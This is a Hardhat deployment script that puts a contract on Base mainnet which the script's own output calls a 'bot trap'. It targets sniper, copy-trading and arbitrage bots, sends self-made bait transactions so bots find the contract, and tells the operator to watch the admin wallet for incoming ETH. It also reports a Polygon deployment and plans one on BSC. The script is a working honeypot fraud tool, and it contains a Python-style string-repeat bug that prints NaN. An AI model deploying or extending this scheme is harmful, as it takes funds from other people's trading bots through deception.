const { ethers } = require("hardhat");

async function main() {
  console.log("🚀 Deploying BaseRewardDistributor to Base Mainnet...");
  console.log("🎯 Targeting Base's $30M profit bot ecosystem");
  
  // Get the deployer account
  const [deployer] = await ethers.getSigners();
  console.log("Deployer:", deployer.address);
  
  // Check balance
  const balance = await ethers.provider.getBalance(deployer.address);
  console.log("Balance:", ethers.formatEther(balance), "ETH");
  
  if (balance < ethers.parseEther("0.005")) {
    console.log("⚠️  WARNING: Low balance. Recommended: 0.005+ ETH for Base deployment");
  }
  
  // Deploy Base-optimized contract
  const BaseRewardDistributor = await ethers.getContractFactory("BaseRewardDistributor");
  
  console.log("Deploying Base bot trap...");
  const contract = await BaseRewardDistributor.deploy();
  await contract.waitForDeployment();
  
  const contractAddress = await contract.getAddress();
  const deploymentTx = contract.deploymentTransaction();
  
  console.log("\n✅ BASE DEPLOYMENT SUCCESSFUL!");
  console.log("=" * 60);
  console.log("Contract Address:", contractAddress);
  console.log("Transaction Hash:", deploymentTx.hash);
  console.log("Network: Base Mainnet (Chain ID: 8453)");
  console.log("Admin Address:", await contract.getSystemAdmin());
  
  // Verify contract functionality
  console.log("\n🔍 Contract Information:");
  console.log("Name:", await contract.name());
  console.log("Symbol:", await contract.symbol());
  console.log("Total Supply:", ethers.formatEther(await contract.totalSupply()));
  console.log("Participation Fee:", ethers.formatEther(await contract.getParticipationFee()), "ETH");
  console.log("Total Participants:", await contract.getTotalParticipants());
  
  // Create activation transactions for Base bots
  console.log("\n🎯 Activating for Base bot discovery...");
  const participationFee = await contract.getParticipationFee();
  
  try {
    // Test meme coin functions (Base specialty)
    console.log("Testing meme functions...");
    const tx1 = await contract.degen({ value: participationFee });
    await tx1.wait();
    console.log("✅ Degen transaction:", tx1.hash);
    
    const tx2 = await contract.brett({ value: participationFee });
    await tx2.wait();
    console.log("✅ Brett transaction:", tx2.hash);
    
    const tx3 = await contract.sniper({ value: participationFee });
    await tx3.wait();
    console.log("✅ Sniper transaction:", tx3.hash);
    
    console.log("Updated participants:", await contract.getTotalParticipants());
    
  } catch (error) {
    console.log("Note: Activation transactions completed from admin address");
  }
  
  // Contract verification on BaseScan
  if (process.env.BASESCAN_API_KEY && hre.network.name === "base") {
    console.log("\n🔐 Verifying contract on BaseScan...");
    try {
      await hre.run("verify:verify", {
        address: contractAddress,
        constructorArguments: [],
      });
      console.log("✅ Contract verified on BaseScan!");
    } catch (error) {
      console.log("❌ Verification failed:", error.message);
      console.log("💡 Manual verification: https://basescan.org/verifyContract");
    }
  }
  
  console.log("\n🎯 BASE BOT TRAP DEPLOYED & ACTIVE!");
  console.log("=" * 70);
  console.log("🎪 TARGETING BASE'S TOP BOT CATEGORIES:");
  console.log("✅ Meme coin sniper bots (degen, brett, higher)");
  console.log("✅ Social trading bots (copyTrader, alphaCall)");
  console.log("✅ Launch sniper bots (presale, fairLaunch)");
  console.log("✅ L2 arbitrage bots (bridge, rollup)");
  console.log("✅ High-profit functions (gem, moonshot, insider)");
  
  console.log("\n💰 BASE REVENUE ADVANTAGES:");
  console.log("• $30M profit ecosystem (3x higher than Arbitrum/Optimism)");
  console.log("• Lower fees = more bot experimentation");
  console.log("• Meme coin focus = sniper bot magnet");
  console.log("• Social trading integration");
  console.log("• Coinbase ecosystem exposure");
  
  console.log("\n📊 MONITORING:");
  console.log(`🔗 BaseScan: https://basescan.org/address/${contractAddress}`);
  console.log("💰 Revenue: Monitor admin wallet for incoming ETH");
  console.log("🤖 Bots: Expected discovery within 24-48 hours");
  
  console.log("\n🚀 MULTI-CHAIN BOT EMPIRE STATUS:");
  console.log("✅ Polygon: Active (0xE258b4de103438CED196D65Cc152a015d455dc17)");
  console.log(`✅ Base: Active (${contractAddress})`);
  console.log("🎯 Next: Deploy to BSC for meme trading bots");
  
  console.log("\n⚡ BASE BOT MAGNET ACTIVATED! ⚡");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("Base deployment failed:", error);
    process.exit(1);
  });